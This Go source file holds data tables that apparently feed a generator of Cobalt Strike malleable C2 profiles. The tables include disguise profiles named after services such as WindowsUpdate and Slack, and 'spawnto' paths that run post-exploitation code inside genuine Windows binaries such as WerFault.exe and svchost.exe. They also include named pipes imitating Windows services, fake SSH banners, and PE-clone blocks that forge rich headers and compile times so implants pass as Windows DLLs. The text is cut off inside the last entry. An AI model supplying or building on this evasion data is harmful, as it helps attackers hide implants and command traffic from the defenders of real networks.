package Struct

var Profile_Names = []string{
	``,
	`WindowsUpdate`,
	`Slack`,
	`Gotomeeting`,
	`Outlook.Live`,
	`Safebrowsing`,
	`AzureEdge`,
	`Field-Keyword`,
	`Custom`}

var Post_EX_Process_Name = []string{`
	set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
	set spawnto_x64 "%windir%\\sysnative\\WerFault.exe"; 
`, `
	set spawnto_x86 "%windir%\\syswow64\\WWAHost.exe";
	set spawnto_x64 "%windir%\\sysnative\\WWAHost.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\wlanext.exe";
	set spawnto_x64 "%windir%\\sysnative\\wlanext.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\auditpol.exe";
	set spawnto_x64 "%windir%\\sysnative\\auditpol.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\bootcfg.exe";
	set spawnto_x64 "%windir%\\sysnative\\bootcfg.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\choice.exe";
	set spawnto_x64 "%windir%\\sysnative\\choice.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\bootcfg.exe";
	set spawnto_x64 "%windir%\sysnative\\bootcfg.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\dtdump.exe";
	set spawnto_x64 "%windir%\\sysnative\\dtdump.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\expand.exe";
	set spawnto_x64 "%windir%\\sysnative\\expand.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\fsutil.exe";
	set spawnto_x64 "%windir%\\sysnative\\fsutil.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
	set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\gpresult.exe";
	set spawnto_x64 "%windir%\\sysnative\\gpresult.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\logman.exe";
	set spawnto_x64 "%windir%\\sysnative\\logman.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\mcbuilder.exe";
	set spawnto_x64 "%windir%\\sysnative\\mcbuilder.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\mtstocom.exe";
	set spawnto_x64 "%windir%\\sysnative\\mtstocom.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\pcaui.exe";
	set spawnto_x64 "%windir%\\sysnative\\pcaui.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\powercfg.exe";
	set spawnto_x64 "%windir%\\sysnative\\powercfg.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\svchost.exe";
	set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
`}

var Pipename_list = []string{
	"SapIServerPipes-1-5-5-0",
	"epmapper-",
	"atsvc-",
	"plugplay+",
	"srvsvc-1-5-5-0",
	"W32TIME_ALT_",
	"tapsrv_",
	"Printer_Spools_",
}

var SSH_Banner = []string{
	"Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)",
	"Welcome to Ubuntu 19.10.0 LTS (GNU/Linux 4.4.0-19037-aws x86_64)",
	"Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.3.0-1035-aws x86_64)",
	"Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)",
	"OpenSSH_7.4 Debian (protocol 2.0)",
	"OpenSSH_8.6 Debian (protocol 2.0)",
	"OpenSSH_7. Debian (protocol 2.0)",
	"OpenSSH_7.4 Debian (protocol 2.0)",
}

var Peclone_list = []string{`
	set checksum       "0";
	set compile_time   "11 Nov 2016 04:08:32";
	set entry_point    "650688";
	set image_size_x86 "4661248";
	set image_size_x64 "4661248";
	set name   "srv.dll";
	set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
		`, `  
	set checksum       "0";
	set compile_time   "09 Jul 1995 05:50:04";
	set entry_point    "137648";
	set image_size_x86 "761856";
	set image_size_x64 "761856";
	set name           "ActivationManager.dll";
	set rich_header    "\x80\x48\xf3\x2d\xc4\x29\x9d\x7e\xc4\x29\x9d\x7e\xc4\x29\x9d\x7e\xcd\x51\x0e\x7e\x6f\x29\x9d\x7e\x9f\x41\x99\x7f\xd0\x29\x9d\x7e\x9f\x41\x9e\x7f\xc7\x29\x9d\x7e\x9f\x41\x98\x7f\xdb\x29\x9d\x7e\xc4\x29\x9c\x7e\x37\x2c\x9d\x7e\x9f\x41\x9c\x7f\xcc\x29\x9d\x7e\x9f\x41\x9d\x7f\xc5\x29\x9d\x7e\x9f\x41\x93\x7f\x97\x29\x9d\x7e\x9f\x41\x60\x7e\xc5\x29\x9d\x7e\x9f\x41\x62\x7e\xc5\x29\x9d\x7e\x9f\x41\x9f\x7f\xc5\x29\x9d\x7e\x52\x69\x63\x68\xc4\x29\x9d\x7e\x00\x00\x00\x00\x00\x00\x00\x00";
`, `
	set checksum       "0";
	set compile_time   "30 Apr 2074 10:15:36";
	set entry_point    "148048";
	set image_size_x86 "2142208";
	set image_size_x64 "2142208";
	set name           "audioeng.dll";
	set rich_header    "\x4a\xed\xf6\x67\x0e\x8c\x98\x34\x0e\x8c\x98\x34\x0e\x8c\x98\x34\x55\xe4\x9c\x35\x02\x8c\x98\x34\x55\xe4\x9b\x35\x0d\x8c\x98\x34\x55\xe4\x9d\x35\x12\x8c\x98\x34\x55\xe4\x99\x35\x0a\x8c\x98\x34\x07\xf4\x0b\x34\x6d\x8c\x98\x34\x0e\x8c\x99\x34\x41\x89\x98\x34\x55\xe4\x98\x35\x0f\x8c\x98\x34\x55\xe4\x96\x35\x2a\x8d\x98\x34\x55\xe4\x65\x34\x0f\x8c\x98\x34\x55\xe4\x67\x34\x0f\x8c\x98\x34\x55\xe4\x9a\x35\x0f\x8c\x98\x34\x52\x69\x63\x68\x0e\x8c\x98\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "26 Jan 2091 14:16:43";
	set entry_point    "1064336";
	set image_size_x86 "1966080";
	set image_size_x64 "1966080";
	set name           "AzureSettingSyncProvider.DLL";
	set rich_header    "\x44\xba\xe1\x13\x00\xdb\x8f\x40\x00\xdb\x8f\x40\x00\xdb\x8f\x40\x09\xa3\x1c\x40\x6e\xdb\x8f\x40\x5b\xb3\x8c\x41\x03\xdb\x8f\x40\x00\xdb\x8e\x40\xa6\xda\x8f\x40\x5b\xb3\x8e\x41\x09\xdb\x8f\x40\x5b\xb3\x8a\x41\x18\xdb\x8f\x40\x5b\xb3\x8b\x41\x41\xdb\x8f\x40\x5b\xb3\x8f\x41\x01\xdb\x8f\x40\x5b\xb3\x86\x41\x7a\xdb\x8f\x40\x5b\xb3\x70\x40\x01\xdb\x8f\x40\x5b\xb3\x8d\x41\x01\xdb\x8f\x40\x52\x69\x63\x68\x00\xdb\x8f\x40\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "21 Dec 2053 07:47:21";
	set entry_point    "5266400";
	set image_size_x86 "9375744";
	set image_size_x64 "9375744";
	set name           "BingMaps.dll";
	set rich_header    "\xd0\xc8\x67\xde\x94\xa9\x09\x8d\x94\xa9\x09\x8d\x94\xa9\x09\x8d\x9d\xd1\x9a\x8d\xf2\xa9\x09\x8d\xcf\xc1\x0d\x8c\x9f\xa9\x09\x8d\xcf\xc1\x0a\x8c\x97\xa9\x09\x8d\xcf\xc1\x0c\x8c\xb5\xa9\x09\x8d\x94\xa9\x08\x8d\x1a\xac\x09\x8d\xcf\xc1\x08\x8c\x87\xa9\x09\x8d\xcf\xc1\x09\x8c\x95\xa9\x09\x8d\xcf\xc1\x00\x8c\x3e\xa8\x09\x8d\xcf\xc1\xf4\x8d\x96\xa9\x09\x8d\xcf\xc1\xf6\x8d\x95\xa9\x09\x8d\xcf\xc1\x0b\x8c\x95\xa9\x09\x8d\x52\x69\x63\x68\x94\xa9\x09\x8d\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "13 Aug 2104 07:50:19";
	set entry_point    "231008";
	set image_size_x86 "339968";
	set image_size_x64 "339968";
	set name           "BootMenuUX.dll";
	set rich_header    "\x9f\xd8\xba\x57\xdb\xb9\xd4\x04\xdb\xb9\xd4\x04\xdb\xb9\xd4\x04\xd2\xc1\x47\x04\xb5\xb9\xd4\x04\x80\xd1\xd7\x05\xd8\xb9\xd4\x04\x80\xd1\xd0\x05\xd4\xb9\xd4\x04\xdb\xb9\xd5\x04\x6c\xb8\xd4\x04\x80\xd1\xd5\x05\xf8\xb9\xd4\x04\x80\xd1\xd4\x05\xda\xb9\xd4\x04\x80\xd1\xdd\x05\xb2\xb9\xd4\x04\x80\xd1\xd1\x05\xdd\xb9\xd4\x04\x80\xd1\x2b\x04\xda\xb9\xd4\x04\x80\xd1\xd6\x05\xda\xb9\xd4\x04\x52\x69\x63\x68\xdb\xb9\xd4\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "25 Jan 2020 23:17:33";
	set entry_point    "217152";
	set image_size_x86 "1077248";
	set image_size_x64 "1077248";
	set name           "DIAGCPL.dll";
	set rich_header    "\x2d\xf1\x0e\x49\x69\x90\x60\x1a\x69\x90\x60\x1a\x69\x90\x60\x1a\x32\xf8\x64\x1b\x7c\x90\x60\x1a\x32\xf8\x63\x1b\x6a\x90\x60\x1a\x32\xf8\x65\x1b\x6a\x90\x60\x1a\x69\x90\x61\x1a\xba\x91\x60\x1a\x32\xf8\x61\x1b\x4a\x90\x60\x1a\x32\xf8\x60\x1b\x68\x90\x60\x1a\x32\xf8\x69\x1b\x59\x90\x60\x1a\x32\xf8\x9f\x1a\x68\x90\x60\x1a\x32\xf8\x62\x1b\x68\x90\x60\x1a\x52\x69\x63\x68\x69\x90\x60\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "20 Jan 2030 21:55:22";
	set entry_point    "216032";
	set image_size_x86 "352256";
	set image_size_x64 "352256";
	set name           "FIREWALLCONTROLPANEL.dll";
	set rich_header    "\xf9\xc2\xa0\x1b\xbd\xa3\xce\x48\xbd\xa3\xce\x48\xbd\xa3\xce\x48\xb4\xdb\x5d\x48\xf9\xa3\xce\x48\xe6\xcb\xcd\x49\xbe\xa3\xce\x48\xe6\xcb\xca\x49\xab\xa3\xce\x48\xe6\xcb\xcb\x49\xb4\xa3\xce\x48\xbd\xa3\xcf\x48\x84\xa1\xce\x48\xe6\xcb\xcf\x49\xaa\xa3\xce\x48\xe6\xcb\xce\x49\xbc\xa3\xce\x48\xe6\xcb\xc7\x49\x93\xa3\xce\x48\xe6\xcb\x31\x48\xbc\xa3\xce\x48\xe6\xcb\xcc\x49\xbc\xa3\xce\x48\x52\x69\x63\x68\xbd\xa3\xce\x48\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "31 Jul 2090 12:56:16";
	set entry_point    "186192";
	set image_size_x86 "1490944";
	set image_size_x64 "1490944";
	set name           "WMNetMgr.DLL";
	set rich_header    "\x35\xe0\x65\x56\x71\x81\x0b\x05\x71\x81\x0b\x05\x71\x81\x0b\x05\x2a\xe9\x08\x04\x72\x81\x0b\x05\x2a\xe9\x0f\x04\x66\x81\x0b\x05\x71\x81\x0a\x05\xf7\x80\x0b\x05\x2a\xe9\x0a\x04\x7c\x81\x0b\x05\x2a\xe9\x0e\x04\x79\x81\x0b\x05\x2a\xe9\x0b\x04\x70\x81\x0b\x05\x2a\xe9\x05\x04\xb9\x81\x0b\x05\x2a\xe9\xf4\x05\x70\x81\x0b\x05\x2a\xe9\x09\x04\x70\x81\x0b\x05\x52\x69\x63\x68\x71\x81\x0b\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "19 Apr 2070 21:37:24";
	set entry_point    "13760";
	set image_size_x86 "548864";
	set image_size_x64 "548864";
	set name           "wwanapi.dll";
	set rich_header    "\x39\x39\x83\xe8\x7d\x58\xed\xbb\x7d\x58\xed\xbb\x7d\x58\xed\xbb\x74\x20\x7e\xbb\x3b\x58\xed\xbb\x26\x30\xee\xba\x7e\x58\xed\xbb\x26\x30\xe9\xba\x69\x58\xed\xbb\x7d\x58\xec\xbb\xbf\x58\xed\xbb\x26\x30\xec\xba\x78\x58\xed\xbb\x26\x30\xe8\xba\x71\x58\xed\xbb\x26\x30\xed\xba\x7c\x58\xed\xbb\x26\x30\xe3\xba\x1f\x58\xed\xbb\x26\x30\x12\xbb\x7c\x58\xed\xbb\x26\x30\xef\xba\x7c\x58\xed\xbb\x52\x69\x63\x68\x7d\x58\xed\xbb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "17 Nov 2003 16:56:11";
	set entry_point    "194608";
	set image_size_x86 "770048";
	set image_size_x64 "770048";
	set name           "Windows.Storage.Search.dll";
	set rich_header    "\xa9\xbc\xd1\xd5\xed\xdd\xbf\x86\xed\xdd\xbf\x86\xed\xdd\xbf\x86\xe4\xa5\x2c\x86\x99\xdd\xbf\x86\xb6\xb5\x42\x86\xfa\xdd\xbf\x86\xb6\xb5\xbc\x87\xee\xdd\xbf\x86\xb6\xb5\xbb\x87\xf1\xdd\xbf\x86\xed\xdd\xbe\x86\xbe\xdf\xbf\x86\xb6\xb5\xbe\x87\xe4\xdd\xbf\x86\xb6\xb5\xba\x87\xee\xdd\xbf\x86\xb6\xb5\xbf\x87\xec\xdd\xbf\x86\xb6\xb5\xb1\x87\x8a\xdd\xbf\x86\xb6\xb5\x40\x86\xec\xdd\xbf\x86\xb6\xb5\xbd\x87\xec\xdd\xbf\x86\x52\x69\x63\x68\xed\xdd\xbf\x86\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "05 Jun 2028 09:16:06";
	set entry_point    "229200";
	set image_size_x86 "397312";
	set image_size_x64 "397312";
	set name           "Windows.System.Diagnostics.dll";
	set rich_header    "\x56\xb8\x3f\x82\x12\xd9\x51\xd1\x12\xd9\x51\xd1\x12\xd9\x51\xd1\x1b\xa1\xc2\xd1\x7b\xd9\x51\xd1\x49\xb1\x55\xd0\x19\xd9\x51\xd1\x49\xb1\x52\xd0\x11\xd9\x51\xd1\x49\xb1\x54\xd0\x0c\xd9\x51\xd1\x12\xd9\x50\xd1\x0f\xdc\x51\xd1\x49\xb1\x50\xd0\x1a\xd9\x51\xd1\x49\xb1\x51\xd0\x13\xd9\x51\xd1\x49\xb1\x58\xd0\x3f\xd9\x51\xd1\x49\xb1\xac\xd1\x13\xd9\x51\xd1\x49\xb1\xae\xd1\x13\xd9\x51\xd1\x49\xb1\x53\xd0\x13\xd9\x51\xd1\x52\x69\x63\x68\x12\xd9\x51\xd1\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "04 Jul 2034 11:53:44";
	set entry_point    "499072";
	set image_size_x86 "749568";
	set image_size_x64 "749568";
	set name           "Windows.System.Launcher.dll";
	set rich_header    "\x47\xa6\x6c\x0f\x03\xc7\x02\x5c\x03\xc7\x02\x5c\x03\xc7\x02\x5c\x0a\xbf\x91\x5c\x69\xc7\x02\x5c\x58\xaf\x01\x5d\x00\xc7\x02\x5c\x58\xaf\x06\x5d\x13\xc7\x02\x5c\x03\xc7\x03\x5c\x1d\xc6\x02\x5c\x58\xaf\x03\x5d\x0a\xc7\x02\x5c\x58\xaf\x07\x5d\x0f\xc7\x02\x5c\x58\xaf\x02\x5d\x02\xc7\x02\x5c\x58\xaf\x0b\x5d\x1a\xc7\x02\x5c\x58\xaf\xfd\x5c\x02\xc7\x02\x5c\x58\xaf\x00\x5d\x02\xc7\x02\x5c\x52\x69\x63\x68\x03\xc7\x02\x5c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`, `
	set checksum       "0";
	set compile_time   "22 Nov 2077 06:35:05";
	set entry_point    "174288";
	set image_size_x86 "352256";
	set image_size_x64 "352256";
	set name           "Windows.System.SystemManagement.dll";
	set rich_header    "\x1e\x43\xad\x11\x5a\x22\xc3\x42\x5a\x22\xc3\x42\x5a\x22\xc3\x42\x53\x5a\x50\x42\x35\x22\xc3\x42\x01\x4a\xc7\x43\x51\x22\xc3\x42\x01\x4a\xc0\x43\x59\x22\xc3\x42\x01\x4a\xc6\x43\x44\x22\xc3\x42\x5a\x22\xc2\x42\x6f\x27\xc3\x42\x01\x4a\xc2\x43\x52\x22\xc3\x42\x01\x4a\xc3\x43\x5b\x22\xc3\x42\x01\x4a\xca\x43\x72\x22\xc3\x42\x01\x4a\x3e\x42\x5b\x22\xc3\x42\x01\x4a\x3c\x42\x5b\x22\xc3\x42\x01\x4a\xc1\x43\x5b\x22\xc3\x42\x52\x69\x63\x68\x5a\x22\xc3\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`, `
	set checksum       "0";
	set compile_time   "02 Sep 1979 16:19:10";
	set entry_point    "244336";
	set image_size_x86 "450560";
	set image_size_x64 "450560";
	set name           "Windows.UI.BioFeedback.dll";
	set rich_header    "\x2e\xc5\x24\x6b\x6a\xa4\x4a\x38\x6a\xa4\x4a\x38\x6a\xa4\x4a\x38\x63\xdc\xd9\x38\x58\xa4\x4a\x38\x31\xcc\x49\x39\x69\xa4\x4a\x38\x31\xcc\x4e\x39\x54\xa4\x4a\x38\x31\xcc\x4f\x39\x72\xa4\x4a\x38\x31\xcc\x4b\x39\x6d\xa4\x4a\x38\x6a\xa4\x4b\x38\x6f\xa5\x4a\x38\x31\xcc\x4a\x39\x6b\xa4\x4a\x38\x31\xcc\x43\x39\x60\xa4\x4a\x38\x31\xcc\xb5\x38\x6b\xa4\x4a\x38\x31\xcc\x48\x39\x6b\xa4\x4a\x38\x52\x69\x63\x68\x6a\xa4\x4a\x38\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "21 Apr 2088 08:58:42";
	set entry_point    "263424";
	set image_size_x86 "495616";
	set image_size_x64 "495616";
	set name           "Windows.UI.BlockedShutdown.dll";
	set rich_header    "\xe4\xce\xe6\x5e\xa0\xaf\x88\x0d\xa0\xaf\x88\x0d\xa0\xaf\x88\x0d\xa9\xd7\x1b\x0d\x96\xaf\x88\x0d\xfb\xc7\x8b\x0c\xa3\xaf\x88\x0d\xfb\xc7\x8c\x0c\x9f\xaf\x88\x0d\xfb\xc7\x8d\x0c\xb8\xaf\x88\x0d\xfb\xc7\x89\x0c\xa9\xaf\x88\x0d\xa0\xaf\x89\x0d\xb9\xae\x88\x0d\xfb\xc7\x88\x0c\xa1\xaf\x88\x0d\xfb\xc7\x81\x0c\xac\xaf\x88\x0d\xfb\xc7\x77\x0d\xa1\xaf\x88\x0d\xfb\xc7\x8a\x0c\xa1\xaf\x88\x0d\x52\x69\x63\x68\xa0\xaf\x88\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "09 Apr 2088 13:20:50";
	set entry_point    "622480";
	set image_size_x86 "942080";
	set image_size_x64 "942080";
	set name           "Windows.UI.Core.TextInput.DLL";
	set rich_header    "\x15\xc1\x87\x6a\x51\xa0\xe9\x39\x51\xa0\xe9\x39\x51\xa0\xe9\x39\x58\xd8\x7a\x39\x0f\xa0\xe9\x39\x0a\xc8\xea\x38\x52\xa0\xe9\x39\x0a\xc8\xed\x38\x43\xa0\xe9\x39\x51\xa0\xe8\x39\x4c\xa1\xe9\x39\x0a\xc8\xe8\x38\x5a\xa0\xe9\x39\x0a\xc8\xec\x38\x5d\xa0\xe9\x39\x0a\xc8\xe9\x38\x50\xa0\xe9\x39\x0a\xc8\xe0\x38\x0c\xa0\xe9\x39\x0a\xc8\x16\x39\x50\xa0\xe9\x39\x0a\xc8\xeb\x38\x50\xa0\xe9\x39\x52\x69\x63\x68\x51\xa0\xe9\x39\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "29 May 2067 18:44:41";
	set entry_point    "29296";
	set image_size_x86 "413696";
	set image_size_x64 "413696";
	set name           "FILEMGMT.DLL";
	set rich_header    "\x75\x90\x3e\x81\x31\xf1\x50\xd2\x31\xf1\x50\xd2\x31\xf1\x50\xd2\x6a\x99\x53\xd3\x32\xf1\x50\xd2\x6a\x99\x54\xd3\x22\xf1\x50\xd2\x6a\x99\x51\xd3\x24\xf1\x50\xd2\x31\xf1\x51\xd2\x06\xf3\x50\xd2\x6a\x99\x55\xd3\x3b\xf1\x50\xd2\x6a\x99\x50\xd3\x30\xf1\x50\xd2\x6a\x99\x5e\xd3\x0a\xf1\x50\xd2\x6a\x99\xaf\xd2\x30\xf1\x50\xd2\x6a\x99\x52\xd3\x30\xf1\x50\xd2\x52\x69\x63\x68\x31\xf1\x50\xd2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "20 Oct 1984 19:23:49";
	set entry_point    "376848";
	set image_size_x86 "712704";
	set image_size_x64 "712704";
	set name           "polprocl.dll";
	set rich_header    "\xdc\xa9\xe7\xf1\x98\xc8\x89\xa2\x98\xc8\x89\xa2\x98\xc8\x89\xa2\x91\xb0\x1a\xa2\xda\xc8\x89\xa2\xc3\xa0\x8a\xa3\x9b\xc8\x89\xa2\xc3\xa0\x8d\xa3\x8e\xc8\x89\xa2\x98\xc8\x88\xa2\x82\xca\x89\xa2\xc3\xa0\x88\xa3\xab\xc8\x89\xa2\xc3\xa0\x89\xa3\x99\xc8\x89\xa2\xc3\xa0\x80\xa3\x0f\xc8\x89\xa2\xc3\xa0\x8c\xa3\x9f\xc8\x89\xa2\xc3\xa0\x76\xa2\x99\xc8\x89\xa2\xc3\xa0\x8b\xa3\x99\xc8\x89\xa2\x52\x69\x63\x68\x98\xc8\x89\xa2\x00\x00\x00\x00\x00\x00\x00\x00";
	`, `
	set checksum       "0";
	set compile_time   "30 Mar 1994 00:05:14";
	set entry_point    "113632";
	set image_size_x86 "1277952";
	set image_size_x64 "1277952";
	set name           "GPSVC.dll";
	set rich_header    "\xd5\x3a\xd3\x63\x91\x5b\xbd\x30\x91\x5b\xbd\x30\x91\x5b\xbd\x30\x98\x23\x2e\x30\xc5\x5b\xbd\x30\xca\x33\xbe\x31\x92\x5b\xbd\x30\xca\x33\xb9\x31\x82\x5b\xbd\x30\x91\x5b\xbc\x30\x47\x5a\xbd\x30\xca\x33\xbc\x31\x9a\x5b\xbd\x30\xca\x33\xb8\x31\x9b\x5b\xbd\x30\xca\x33\xbd\x31\x90\x5b\xbd\x30\xca\x33\xb3\x31\x08\x5b\xbd\x30\xca\x33\x42\x30\x90\x5b\xbd\x30\xca\x33\xbf\x31\x90\x5b\xbd\x30\x52\x69\x63\x68\x91\x5b\xbd\x30\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "10 Aug 2018 19:22:06";
	set entry_point    "869360";
	set image_size_x86 "1638400";
	set image_size_x64 "1638400";
	set name           "libcrypto.dll";
	set rich_header  "\xbe\xf7\xf9\xa0\xfa\x96\x97\xf3\xfa\x96\x97\xf3\xfa\x96\x97\xf3\x89\xf4\x93\xf2\xf0\x96\x97\xf3\x89\xf4\x94\xf2\xfc\x96\x97\xf3\x89\xf4\x92\xf2\x52\x96\x97\xf3\x64\x36\x50\xf3\xf2\x96\x97\xf3\x28\xf2\x94\xf2\xf3\x96\x97\xf3\x28\xf2\x92\xf2\xef\x96\x97\xf3\x28\xf2\x93\xf2\xeb\x96\x97\xf3\xf3\xee\x04\xf3\xc9\x96\x97\xf3\xfa\x96\x96\xf3\x7d\x96\x97\xf3\x11\xf2\x93\xf2\xd4\x94\x97\xf3\x11\xf2\x97\xf2\xfb\x96\x97\xf3\x11\xf2\x68\xf3\xfb\x96\x97\xf3\xfa\x96\x00\xf3\xfb\x96\x97\xf3\x11\xf2\x95\xf2\xfb\x96\x97\xf3\x52\x69\x63\x68\xfa\x96\x97\xf3\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "06 Jul 1990 07:33:20";
	set entry_point    "210752";
	set image_size_x86 "344064";
	set image_size_x64 "344064";
	set name           "rdpcomapi.DLL";
		set rich_header    "\x40\x89\xc2\x2f\x04\xe8\xac\x7c\x04\xe8\xac\x7c\x04\xe8\xac\x7c\x0d\x90\x3f\x7c\x50\xe8\xac\x7c\x5f\x80\xa8\x7d\x12\xe8\xac\x7c\x04\xe8\xad\x7c\x20\xe9\xac\x7c\x5f\x80\xad\x7d\x03\xe8\xac\x7c\x5f\x80\xaf\x7d\x00\xe8\xac\x7c\x5f\x80\xa9\x7d\x02\xe8\xac\x7c\x5f\x80\xac\x7d\x05\xe8\xac\x7c\x5f\x80\xa5\x7d\x23\xe8\xac\x7c\x5f\x80\x53\x7c\x05\xe8\xac\x7c\x5f\x80\xae\x7d\x05\xe8\xac\x7c\x52\x69\x63\x68\x04\xe8\xac\x7c\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "05 Nov 2018 23:03:21";
	set entry_point    "657360";
	set image_size_x86 "880640";
	set image_size_x64 "880640";
	set name           "winsqlite3.dll";
	set rich_header    "\xe5\x3e\x6d\xff\xa1\x5f\x03\xac\xa1\x5f\x03\xac\xa1\x5f\x03\xac\x9a\x01\x00\xad\xa7\x5f\x03\xac\x9a\x01\x06\xad\xb7\x5f\x03\xac\x9a\x01\x07\xad\xac\x5f\x03\xac\xa8\x27\x90\xac\x92\x5f\x03\xac\xa1\x5f\x02\xac\xd8\x5f\x03\xac\x36\x01\x07\xad\xa0\x5f\x03\xac\x36\x01\x03\xad\xa0\x5f\x03\xac\x33\x01\xfc\xac\xa0\x5f\x03\xac\x36\x01\x01\xad\xa0\x5f\x03\xac\x52\x69\x63\x68\xa1\x5f\x03\xac\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "14 Oct 2074 07:37:20";
	set entry_point    "96192";
	set image_size_x86 "348160";
	set image_size_x64 "348160";
	set name           "wow64.dll";
	set rich_header    "\x81\xe8\xb7\x79\xc5\x89\xd9\x2a\xc5\x89\xd9\x2a\xc5\x89\xd9\x2a\x9e\xe1\xd8\x2b\xc0\x89\xd9\x2a\xc5\x89\xd8\x2a\x85\x8b\xd9\x2a\x9e\xe1\xdd\x2b\xc3\x89\xd9\x2a\x9e\xe1\xd9\x2b\xc4\x89\xd9\x2a\x9e\xe1\xda\x2b\xc0\x89\xd9\x2a\x9e\xe1\xd4\x2b\xec\x89\xd9\x2a\x9e\xe1\x26\x2a\xc4\x89\xd9\x2a\x9e\xe1\xdb\x2b\xc4\x89\xd9\x2a\x52\x69\x63\x68\xc5\x89\xd9\x2a\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "16 Aug 2035 01:40:28";
	set entry_point    "63504";
	set image_size_x86 "512000";
	set image_size_x64 "512000";
	set name           "wow64win.dll";
	set rich_header    "\x78\x0f\x70\x56\x3c\x6e\x1e\x05\x3c\x6e\x1e\x05\x3c\x6e\x1e\x05\x67\x06\x1f\x04\x39\x6e\x1e\x05\x3c\x6e\x1f\x05\x27\x6e\x1e\x05\x67\x06\x13\x04\x34\x6e\x1e\x05\x67\x06\x1a\x04\x3a\x6e\x1e\x05\x67\x06\x1e\x04\x3d\x6e\x1e\x05\x67\x06\x1d\x04\x3f\x6e\x1e\x05\x67\x06\xe1\x05\x3d\x6e\x1e\x05\x67\x06\x1c\x04\x3d\x6e\x1e\x05\x52\x69\x63\x68\x3c\x6e\x1e\x05\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "0";
	set compile_time   "02 Feb 2020 19:59:15";
	set entry_point    "1056672";
	set image_size_x86 "1785856";
	set image_size_x64 "1785856";
	set name           "WWANSVC.DLL";
